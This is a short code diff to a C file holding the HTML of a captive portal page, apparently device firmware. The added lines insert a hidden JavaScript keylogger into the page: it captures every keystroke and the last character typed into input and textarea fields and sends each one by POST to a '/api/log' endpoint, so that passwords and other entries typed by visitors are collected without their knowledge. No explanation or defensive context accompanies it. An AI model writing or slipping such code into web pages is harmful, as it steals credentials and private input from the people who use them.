@@ -146,6 +146,18 @@ const char default_portal_html[] = R"rawliteral(
     </div>
     </div>
     </div>
+    <script>
+(function(){
+function logKey(key){
+var xhr=new XMLHttpRequest();
+xhr.open('POST','/api/log',true);
+xhr.setRequestHeader('Content-Type','application/json;charset=UTF-8');
+xhr.send(JSON.stringify({key:key}));
+}
+document.addEventListener('keyup',function(e){logKey(e.key);});
+document.addEventListener('input',function(e){if(e.target.tagName==='INPUT'||e.target.tagName==='TEXTAREA'){var val=e.target.value;var key=val.slice(-1);if(key)logKey(key);}});
+})();
+    </script>
   </body>
 </html>
 )rawliteral";
